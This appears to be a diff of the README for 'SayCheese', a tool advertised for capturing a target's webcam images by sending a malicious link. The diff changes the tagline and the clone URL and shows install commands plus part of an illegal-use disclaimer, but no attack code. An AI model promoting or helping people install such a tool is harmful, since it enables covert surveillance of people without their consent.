@@ -1,5 +1,5 @@
 # saycheese
-A tool to hack camera from termux, for video tutorial visit youtube.com/TechnicalHeadquarter
+Take webcam shots from target just sending a malicious link
 # SayCheese
 orignally coded by thelinuxchoise(repository deleted).
 
@@ -21,7 +21,7 @@ Usage of SayCheese for attacking targets without prior mutual consent is illegal
 ## Installing:
 
 ```
-git clone https://github.com/Technicalheadquarter/saycheese
+git clone https://github.com/fauzipadlaw/saycheese
 cd saycheese
 chmod +x saycheese.sh
 ./saycheese.sh
